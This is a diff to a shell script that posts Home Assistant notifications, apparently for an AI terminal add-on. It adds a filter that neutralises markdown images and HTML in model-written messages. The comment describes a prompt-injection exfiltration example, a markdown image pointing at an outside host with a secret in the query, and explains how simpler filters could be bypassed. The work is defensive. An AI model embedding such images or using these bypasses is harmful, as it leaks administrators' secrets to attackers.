@@ -22,9 +22,24 @@ notify_id="${3:-claude_terminal}"
 [ -n "$message" ] || exit 0
 [ -n "${SUPERVISOR_TOKEN:-}" ] || exit 0
 
+# Home Assistant renders a notification as markdown, and a markdown IMAGE is
+# fetched by the browser the moment the drawer opens. Much of what arrives
+# here is model output (the end of a turn, a scheduled job's reply), so a
+# prompt-injected run could end with ![](https://elsewhere/?d=<a secret>) and
+# have the admin's browser deliver it. Images are turned into plain links,
+# which need a click; links themselves stay, because the sign-in notification
+# is one.
+#
+# Two things that look like simplifications and are bypasses:
+#   "!+" not "!"   removing one "!" from "!![" leaves "![".
+#   every "<"      not a list of tags. <img> is one of many elements that
+#                  fetch on render (video poster, audio, source, iframe, svg
+#                  image...), and a list is only as good as its last entry.
+#                  Nothing the add-on sends relies on HTML.
 payload=$(jq -nc \
     --arg t "$title" --arg m "$message" --arg i "$notify_id" \
-    '{title: $t, message: $m, notification_id: $i}') || exit 0
+    'def inert: gsub("!+\\["; "[") | gsub("<"; "&lt;");
+     {title: ($t | inert), message: ($m | inert), notification_id: $i}') || exit 0
 
 curl -fsS -m 10 -o /dev/null \
     -X POST \
